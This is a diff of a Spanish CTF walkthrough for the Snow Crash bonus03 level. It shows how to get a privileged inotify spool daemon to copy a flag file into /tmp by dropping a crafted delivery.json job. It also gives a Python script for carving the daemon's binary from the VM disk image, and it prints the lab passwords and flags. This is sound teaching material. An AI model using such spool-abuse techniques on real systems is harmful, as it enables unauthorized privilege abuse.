@@ -1,241 +1,273 @@
-# Bonus03 - Snow Crash
+# Bonus03 — Snow Crash
 
-## Tipo de ejercicio
+> **Nivel bonus** · inotify · Spool `/var/spool/cic` · Manifiesto JSON `delivery.json`
+
+| | |
+|---|---|
+| **Proyecto** | Snow Crash (42) |
+| **Nivel** | `bonus03` |
+| **Usuario de entrada** | `bonus03` |
+| **Objetivo** | Credencial de `flagbonus03` |
+| **Idea central** | Job JSON con `action: report` → `/tmp/cic_report` |
+
+---
+
+<a id="indice"></a>
+
+## 📋 Índice
+
+1. 🧭 [¿De qué va este nivel? (visión general)](#sec-1)
+2. 🗺️ [Mapa mental del ataque](#sec-2)
+3. 📖 [Glosario rápido](#sec-3)
+4. 🏷️ [Tipo de ejercicio](#sec-4)
+5. 🎯 [Objetivo](#sec-5)
+6. 🔑 [Acceso al nivel](#sec-6)
+7. 🔍 [Localizar el componente del nivel](#sec-7)
+8. ⚙️ [Identificar el servicio systemd](#sec-8)
+9. 📥 [Localizar el directorio spool](#sec-9)
+10. ⚠️ [Por qué no basta probar a ciegas](#sec-10)
+11. 🔬 [Extraer el binario desde el VDI](#sec-11)
+12. ✅ [Explotación](#sec-12)
+13. 🏁 [Credencial final](#sec-13)
+14. ⌨️ [Resumen de comandos válidos](#sec-14)
+15. 💡 [Conceptos importantes](#sec-15)
+16. 📦 [Conclusión](#sec-16)
+17. 📁 [Estructura recomendada en el repositorio](#sec-17)
+18. 📚 [Para seguir aprendiendo](#sec-18)
+19. 🩹 [Errores frecuentes y qué significan](#sec-err)
+
+> **Tip de navegación:** al final de cada sección encontrarás un enlace **↑ Volver al índice**.
+
+---
+
+<a id="sec-1"></a>
+
+## 1. 🧭 ¿De qué va este nivel? (visión general)
+
+Hay una **bandeja de entrada** (`/var/spool/cic`) vigilada por un conserje
+automatizado (`cic`, usuario `flagbonus03`). Tú puedes dejar sobres en esa
+bandeja porque perteneces al grupo `cic_grp`. Si el sobre se llama
+**`delivery.json`** y pide la acción **`report`**, el conserje copia el
+documento secreto a un casillero público: `/tmp/cic_report`.
+
+No ejecutas el binario ni lees su código en la VM: dejas el formulario correcto
+y lees el resultado.
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-2"></a>
+
+## 2. 🗺️ Mapa mental del ataque
+
+```text
+  [bonus03] ∈ cic_grp
+        │  escribe delivery.json con action:report
+        ▼
+  /var/spool/cic/   (drwxrwsr-x  flagbonus03:cic_grp)
+        │  inotify (creación / cierre de escritura)
+        ▼
+  cic.service  (User=flagbonus03)
+        │  clasifica payload
+        ▼
+  lee /home/flagbonus03/.flag
+  escribe /tmp/cic_report  (legible)
+```
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-3"></a>
+
+## 3. 📖 Glosario rápido
+
+| Término | Analogía cotidiana | Qué es en la práctica |
+|---------|-------------------|------------------------|
+| **inotify** | Sensor en la bandeja de entrada | API de Linux para eventos del sistema de ficheros |
+| **Spool** | Bandeja de trabajos pendientes | Directorio donde se depositan jobs |
+| **Setgid en directorio (`rws`)** | Los papeles nuevos heredan el sello del grupo | Ficheros nuevos llevan grupo `cic_grp` |
+| **Manifiesto JSON** | Formulario con casillas fijas | Fichero de control (`delivery.json`) |
+| **Carve (VDI)** | Buscar el manual del conserje en el archivo del edificio | Extraer el ELF del disco virtual |
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-4"></a>
+
+## 4. 🏷️ Tipo de ejercicio
 
 Explotación de un **daemon inotify** que procesa jobs en un directorio spool
 escribible por el grupo del usuario. Al entregar un manifiesto JSON con la
 acción correcta, el servicio (como `flagbonus03`) copia la flag a un fichero
 legible en `/tmp`.
 
-## Objetivo
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
-Obtener la credencial asociada a `flagbonus03` / al siguiente nivel bonus.
+---
 
-El programa `cic` no es legible ni ejecutable por `bonus03`, pero el servicio
-`cic.service` corre como `flagbonus03` y vigila `/var/spool/cic`. Ese directorio
-es escribible por el grupo `cic_grp`, al que pertenece `bonus03`.
+<a id="sec-5"></a>
 
-La pista del home de `bonus03` es:
+## 5. 🎯 Objetivo
+
+Obtener la credencial asociada a `flagbonus03`.
+
+Pista del README:
 
 ```text
 CIC watches everything. Even the things you think you hid.
 ```
 
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
 ---
 
-## 1. Acceso al nivel
+<a id="sec-6"></a>
 
-Desde el equipo anfitrión (puerto reenviado `2424` en esta configuración; el
-subject oficial usa `4242`):
+## 6. 🔑 Acceso al nivel
 
 ```bash
 ssh bonus03@localhost -p 2424
+# password: cfiioecfib9aobid1abfa0ci8
+whoami; id; cat README
 ```
 
-La contraseña de `bonus03` es la flag de `bonus02`:
+Debes ver el grupo **`cic_grp`**.
 
-```text
-cfiioecfib9aobid1abfa0ci8
-```
-
-Comprobar identidad y entorno:
-
-```bash
-whoami
-id
-pwd
-ls -la
-cat README
-```
-
-Resultado esperado:
-
-```text
-bonus03
-uid=3003(bonus03) gid=3003(bonus03) groups=3003(bonus03),1001(levelgroup),4010(cic_grp)
-/home/bonus03
-```
-
-```text
-CIC watches everything. Even the things you think you hid.
-```
-
-Detalle importante del `id`: el usuario pertenece al grupo **`cic_grp`**
-(`4010`). El *spool* es una carpeta donde se dejan trabajos pendientes para
-que un programa los procese; aquí, el daemon `cic` vigila `/var/spool/cic`.
-Para comprobar que el grupo puede escribir en ese directorio, consulta sus
-permisos:
-
-```bash
-ls -ld /var/spool/cic
-```
-
-La salida documentada es:
-
-```text
-drwxrwsr-x  2 flagbonus03 cic_grp 4096 ... cic
-```
-
-En `drwxrwsr-x`, los permisos del grupo son `rws`: la `w` permite crear
-entradas en el directorio y la `x` permite acceder a él. El grupo propietario
-es `cic_grp`, como muestra la columna `cic_grp`; al confirmar con `id` que
-`bonus03` pertenece a ese grupo, se deduce que puede escribir en el spool. La
-`s` en la posición de ejecución del grupo es el bit **setgid** del directorio:
-hace que los archivos nuevos hereden el grupo `cic_grp`.
-
-La cuenta `flagbonus03` existe con shell nologin:
-
-```bash
-getent passwd flagbonus03
-```
-
-```text
-flagbonus03:x:4003:4003::/home/flagbonus03:/usr/sbin/nologin
-```
-
-No se inicia sesión interactiva como `flagbonus03`. La flag se obtiene a través
-del servicio que corre con sus privilegios.
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 2. Localizar el componente del nivel
+<a id="sec-7"></a>
+
+## 7. 🔍 Localizar el componente del nivel
 
 ```bash
 ls -laR /opt/snowcrash/bonus03
 ```
 
-Resultado:
-
 ```text
-/opt/snowcrash/bonus03:
 -rwxr-x---  1 flagbonus03 flagbonus03 17056 ... cic
 ```
 
-El binario `cic`:
+`bonus03` **no** puede ejecutarlo ni leerlo.
 
-- Propietario y grupo: `flagbonus03`
-- Modo: `750` (`-rwxr-x---`)
-
-`bonus03` **no** puede ejecutarlo ni leerlo (`Permission denied` en `strings`
-y en la ejecución directa).
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 3. Identificar el servicio systemd
+<a id="sec-8"></a>
+
+## 8. ⚙️ Identificar el servicio systemd
 
 ```bash
-systemctl list-units --type=service --all | grep -i cic
 systemctl cat cic.service
 systemctl status cic.service --no-pager
 ```
 
-Definición de `/etc/systemd/system/cic.service`:
-
 ```ini
-[Unit]
-Description=Snow Crash bonus03 — CIC inotify spool daemon
-After=network.target
-
 [Service]
 Type=forking
 User=flagbonus03
 Group=flagbonus03
 ExecStart=/opt/snowcrash/bonus03/cic
 Restart=always
-RestartSec=5
-KillMode=control-group
-
-[Install]
-WantedBy=multi-user.target
 ```
 
-Puntos clave:
+Es un **daemon de spool con inotify**. El servicio ya está `active (running)`.
 
-- El proceso corre como **`flagbonus03`**.
-- Es un **daemon de spool con inotify** (vigila un directorio y reacciona a
-  ficheros nuevos).
-- No hace falta ejecutar el binario: el servicio ya está `active (running)`.
-
-Comprobación del proceso:
-
-```bash
-ps aux | grep -E '[c]ic'
-# flagbon+  ...  /opt/snowcrash/bonus03/cic
-```
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 4. Localizar el directorio spool
+<a id="sec-9"></a>
+
+## 9. 📥 Localizar el directorio spool
 
 ```bash
 ls -la /var/spool
 ls -la /var/spool/cic
 ```
 
-Resultado:
-
 ```text
-drwxrwsr-x  2 flagbonus03 cic_grp 4096 ... cic
+drwxrwsr-x  2 flagbonus03 cic_grp ... cic
 ```
 
 | Elemento | Significado |
 |----------|-------------|
-| `/var/spool/cic` | Spool vigilado por el daemon |
-| `drwxrwsr-x` | Bit setgid (`s` en el grupo): los nuevos ficheros heredan el grupo `cic_grp` |
-| Propietario | `flagbonus03` |
-| Grupo | `cic_grp` |
-| Escritura de grupo | `bonus03` (miembro de `cic_grp`) puede crear ficheros aquí |
+| `/var/spool/cic` | Spool vigilado |
+| `rws` en grupo | setgid: nuevos ficheros heredan `cic_grp` |
+| Escritura de grupo | `bonus03` puede crear ficheros aquí |
 
-El directorio vacío al inicio es normal: el daemon espera **jobs** nuevos.
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 5. Por qué no basta con probar a ciegas
+<a id="sec-10"></a>
+
+## 10. ⚠️ Por qué no basta probar a ciegas
 
 Pruebas típicas que **no** disparan la acción correcta:
 
-- Fichero de texto arbitrario (`test_hello`) → permanece sin procesar.
-- Symlink a `/home/flagbonus03/.flag` → no se sigue como “report”.
-- Script shell en el spool → no se ejecuta.
+- Texto arbitrario → permanece sin procesar
+- Symlink al `.flag` → no se trata como report
+- Script shell en el spool → no se ejecuta
 
-El daemon solo reacciona a un **nombre y formato de payload** concretos. Como
-el binario no es legible en la VM, se obtiene analizándolo **desde el host**.
+Hace falta el **nombre y formato** exactos del job. Como el binario no es
+legible en la VM, se obtiene analizándolo desde el host.
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 6. Extraer el binario desde el VDI (host, sin sudo)
+<a id="sec-11"></a>
 
-En una terminal del **anfitrión** (no dentro de SSH a la OVA):
+## 11. 🔬 Extraer el binario desde el VDI
 
-En las rutas del ejemplo, `login42` es el nombre de usuario del anfitrión;
-sustitúyelo si tu ruta es distinta.
+En el host, carve anclado a `/opt/snowcrash/bonus03/cic` (no solo a la ruta del
+directorio spool, que puede aparecer en otros sitios del disco).
 
-El script Python busca la imagen de disco virtual (`.vdi`) en esas rutas, la
-abre en modo de solo lectura y localiza una copia del ejecutable `cic` usando
-su ruta y cadenas reconocibles. Extrae los bytes del ELF a `/tmp/cic_bin`.
-Después, `file` identifica el archivo y `strings` muestra textos útiles para
-analizar qué hace el daemon. Este análisis se realiza en el anfitrión y es
-opcional: no hace falta para entregar un job al servicio y obtener la flag.
+Tamaño: **17056** bytes.
+
+Cadenas relevantes:
+
+```text
+/var/spool/cic
+inotify_init1
+inotify_add_watch
+delivery.json
+"action":"report"
+"action": "report"
+/home/flagbonus03/.flag
+/tmp/cic_report
+inbound delivery received, dispatching
+```
+
+| Elemento | Valor |
+|----------|--------|
+| Job | `delivery.json` |
+| Acción | `"action":"report"` |
+| Fuente | `/home/flagbonus03/.flag` |
+| Destino | `/tmp/cic_report` |
+
+### Script completo de carve (host)
 
 ```bash
 python3 << 'EOF'
 import mmap, os, sys
 
 candidates = [
-    "/home/login42/sgoinfre/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
-    "/sgoinfre/students/login42/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
+    "/home/sternero/sgoinfre/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
+    "/sgoinfre/students/sternero/42_outer_core/cyber_security/snow-crash/vm/SnowCrash/SnowCrash-disk001.vdi",
 ]
 vdi = next((p for p in candidates if os.path.isfile(p)), None)
 if not vdi:
     print("VDI not found")
     sys.exit(1)
 
-# Anclar al path del ejecutable (no solo a /var/spool/cic, que aparece
-# también como entrada de directorio en el disco y puede apuntar a otro ELF).
-needles = [
-    b"/opt/snowcrash/bonus03/cic",
-    b"bonus03/cic",
-]
+needles = [b"/opt/snowcrash/bonus03/cic", b"bonus03/cic"]
 out = "/tmp/cic_bin"
 size_guess = 17056
 max_back = 500_000
@@ -255,204 +287,172 @@ with open(vdi, "rb") as f:
                 elf_off = start + elf_rel
                 blob = mm[elf_off:elf_off + size_guess + 8192]
                 if b"/var/spool/cic" in blob or b"inotify" in blob:
-                    print(f"candidate needle={n!r} pos={pos} elf={elf_off}")
+                    print(f"candidate {n!r} pos={pos} elf={elf_off}")
                     open(out, "wb").write(mm[elf_off:elf_off + size_guess])
                     found = elf_off
                     break
             pos += 1
         if found is not None:
             break
-    if found is None:
-        print("no suitable ELF found")
-        sys.exit(1)
-    print(f"wrote {size_guess} bytes from {found} -> {out}")
     mm.close()
+    if found is None:
+        print("no suitable ELF")
+        sys.exit(1)
+    print(f"wrote -> {out}")
 EOF
 
 file /tmp/cic_bin
-strings -a /tmp/cic_bin | grep -iE 'spool|inotify|flag|/var|/tmp|/home|\.flag|cic|delivery|report|action'
+strings -a /tmp/cic_bin | grep -iE 'spool|inotify|delivery|report|flag|/tmp'
 ```
 
-Resultado esperado de `file`:
+**Por qué anclar a `/opt/snowcrash/bonus03/cic`:** la cadena `/var/spool/cic`
+también aparece en el disco como **entrada de directorio**. Si buscas solo eso,
+puedes “sacar” otro binario por error (por ejemplo el de otro nivel). La ruta
+del ejecutable es mucho más específica.
 
-```text
-/tmp/cic_bin: ELF 64-bit LSB pie executable, x86-64, ... not stripped
-```
 
-### Cadenas relevantes del binario
-
-```text
-/var/spool/cic
-inotify_init1
-inotify_add_watch
-cic spool monitor active
-delivery.json
-"action":"report"
-"action": "report"
-/home/flagbonus03/.flag
-/tmp/cic_report
-inbound delivery received, dispatching
-intelligence record written to staging area
-cannot open delivery payload: %s
-empty delivery payload, skipping
-manifest processed, no action required
-```
-
-Interpretación del protocolo:
-
-| Elemento | Valor |
-|----------|--------|
-| Directorio vigilado | `/var/spool/cic` |
-| Nombre del job | **`delivery.json`** |
-| Contenido que dispara el report | JSON con **`"action":"report"`** (también acepta espacio tras `:`) |
-| Fuente privilegiada | `/home/flagbonus03/.flag` |
-| Destino legible | **`/tmp/cic_report`** |
-
-El daemon usa `inotify` para detectar el fichero, lo abre, busca la acción
-`report`, lee el `.flag` como `flagbonus03` y escribe el resultado en
-`/tmp/cic_report`.
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 7. Explotación (dentro de la OVA como `bonus03`)
+<a id="sec-12"></a>
+
+## 12. ✅ Explotación
 
 ```bash
-# Limpiar restos de pruebas anteriores
 rm -f /var/spool/cic/* /tmp/cic_report 2>/dev/null
-
-# Entregar el manifiesto
-cat > /var/spool/cic/delivery.json << 'EOF'
-{"action":"report"}
-EOF
-
+echo '{"action":"report"}' > /var/spool/cic/delivery.json
 sleep 2
 ls -la /tmp/cic_report
 cat /tmp/cic_report
 ```
 
-Salida obtenida:
-
 ```text
--rw-r--r-- 1 flagbonus03 flagbonus03 26 ... /tmp/cic_report
 mof3b3iud5c3p35bsv9aua0bj
 ```
 
-Variante equivalente (espacio tras los dos puntos), también válida según las
-cadenas del binario:
+También vale `{"action": "report"}` (espacio tras `:`).
 
-```bash
-echo '{"action": "report"}' > /var/spool/cic/delivery.json
-sleep 2
-cat /tmp/cic_report
-```
-
-### Secuencia
-
-1. `bonus03` crea `/var/spool/cic/delivery.json` (permiso de grupo en el spool).
-2. `cic` recibe el evento inotify, clasifica el payload y ve `action: report`.
-3. Como `flagbonus03`, lee `/home/flagbonus03/.flag`.
-4. Escribe la credencial en `/tmp/cic_report` (legible por todos).
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 8. Credencial final
+<a id="sec-13"></a>
+
+## 13. 🏁 Credencial final
 
 ```text
 mof3b3iud5c3p35bsv9aua0bj
 ```
 
-Guardar en el repositorio:
+→ `bonus03/flag` y contraseña de `bonus04`.
 
-```text
-bonus03/flag
-```
-
-con una sola línea con esa cadena.
-
-Ese valor se usa como contraseña SSH del siguiente nivel bonus (`bonus04`):
-
-```bash
-ssh bonus04@localhost -p 2424
-# password: mof3b3iud5c3p35bsv9aua0bj
-```
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 9. Resumen de comandos válidos
+<a id="sec-14"></a>
 
-### En la OVA (usuario `bonus03`)
+## 14. ⌨️ Resumen de comandos válidos
 
 ```bash
-ssh bonus03@localhost -p 2424
-ls -la
-cat README
-ls -laR /opt/snowcrash/bonus03
 systemctl cat cic.service
 ls -la /var/spool/cic
-
 echo '{"action":"report"}' > /var/spool/cic/delivery.json
 sleep 2
 cat /tmp/cic_report
 ```
 
-### En el host (análisis del binario)
-
-```bash
-# Carve del ELF anclado a /opt/snowcrash/bonus03/cic (script sección 6)
-python3 ...   # → /tmp/cic_bin
-file /tmp/cic_bin
-strings -a /tmp/cic_bin | grep -iE 'spool|inotify|delivery|report|flag'
-```
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 10. Conceptos importantes
+<a id="sec-15"></a>
 
-- **inotify**: API de Linux para recibir eventos del sistema de archivos
-  (creación, cierre de escritura, etc.) sin hacer polling continuo.
-- **Spool escribible por grupo**: el daemon corre como usuario privilegiado
-  (`flagbonus03`) pero el directorio de entrada es usable por `cic_grp`. Es un
-  patrón habitual (y peligroso si el formato del job no está bien acotado).
-- **Setgid en el directorio (`rws`)**: los ficheros nuevos heredan el grupo
-  `cic_grp`, manteniendo la colaboración del grupo sobre el spool.
-- **Manifiesto JSON como trigger**: no se ejecuta código arbitrario del
-  usuario; se evalúa un campo `action`. La acción `report` es la que provoca
-  la lectura del `.flag` y la escritura en `/tmp/cic_report`.
-- **Reverse engineering offline**: cuando el ELF no es legible en la VM, se
-  recupera del VDI en el host. Es importante anclar la búsqueda a una cadena
-  **única del binario** (p. ej. `/opt/snowcrash/bonus03/cic`), no solo a rutas
-  de directorio que también existen en el sistema de archivos del disco.
+## 15. 💡 Conceptos importantes
+
+- inotify como API de eventos de ficheros
+- Spool escribible por grupo + daemon privilegiado
+- Setgid en directorios
+- Manifiesto JSON como trigger (no RCE arbitrario del script)
+- Carve anclado a cadenas del **binario**, no solo a rutas de directorio
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
 
 ---
 
-## 11. Conclusión
+<a id="sec-16"></a>
 
-No se modifica ningún archivo permanente de la OVA más allá de dejar un job
-temporal en el spool. La solución consiste en:
+## 16. 📦 Conclusión
 
-1. Identificar `cic.service` y el spool `/var/spool/cic`.
-2. Confirmar que `bonus03` puede escribir en el spool (`cic_grp`).
-3. Descubrir el formato del job (`delivery.json` + `"action":"report"`)
-   analizando el binario desde el host.
-4. Leer la flag en `/tmp/cic_report`.
-
-Credencial obtenida:
+Formulario correcto en la bandeja → flag en `/tmp`. Credencial:
 
 ```text
 mof3b3iud5c3p35bsv9aua0bj
 ```
 
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
 ---
 
-## 12. Estructura recomendada en el repositorio
+<a id="sec-17"></a>
+
+## 17. 📁 Estructura recomendada en el repositorio
 
 ```text
 bonus03/
-├── flag                          # mof3b3iud5c3p35bsv9aua0bj
+├── flag
 └── resources/
-    └── bonus03.md                # este documento
+    └── bonus03.md
 ```
 
-Según la convención del repo `42_snow-crash`, la guía detallada vive en
-`bonus03/resources/bonus03.md` y el token en `bonus03/flag`.
-```
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<a id="sec-18"></a>
+
+## 18. 📚 Para seguir aprendiendo
+
+| Tema | Pista |
+|------|--------|
+| inotify | `man inotify` |
+| Colas de trabajo | diseño de spools y least privilege |
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+
+---
+
+<a id="sec-err"></a>
+
+## 19. 🩹 Errores frecuentes y qué significan
+
+Cuando algo “no funciona”, casi siempre el mensaje del sistema apunta a una
+causa concreta. Esta tabla resume los síntomas más habituales de **bonus03**,
+qué suelen querer decir y el siguiente comando o acción razonable.
+
+| Síntoma | Causa probable | Qué hacer |
+|---------|----------------|-----------|
+| Ficheros en el spool no desaparecen / no pasa nada | Nombre o JSON incorrectos | El job debe llamarse **`delivery.json`** con `"action":"report"`. |
+| `Permission denied` al escribir en `/var/spool/cic` | No estás en `cic_grp` | `id` debe incluir `cic_grp`. |
+| Symlink al `.flag` no da resultado | El daemon no trata el job como report | Usa el manifiesto JSON, no confíes solo en symlinks. |
+| No existe `/tmp/cic_report` | El servicio no procesó el job o falló | `systemctl is-active cic.service`; revisa el JSON; espera 1–2 s. |
+| `strings` del binario: Permission denied | `cic` no es legible por `bonus03` | Carve del ELF en el **host**. |
+| Carve saca `kourier` u otro binario | Aguja `/var/spool/cic` demasiado genérica | Ancla a `/opt/snowcrash/bonus03/cic`. |
+
+**Cómo usarla:** localiza la fila que más se parezca a lo que ves en pantalla,
+aplica la acción sugerida y, si el síntoma cambia, vuelve a consultar la tabla
+(a menudo un error se resuelve y aparece el siguiente de la lista).
+
+<p align="right"><a href="#indice">↑ Volver al índice</a></p>
+
+---
+
+<div align="center">
+
+**42 Málaga** — **rdel-olm & sternero** — **Octubre 2026**
+
+*Snow Crash · bonus03 · material didáctico de resolución*
+
+</div>
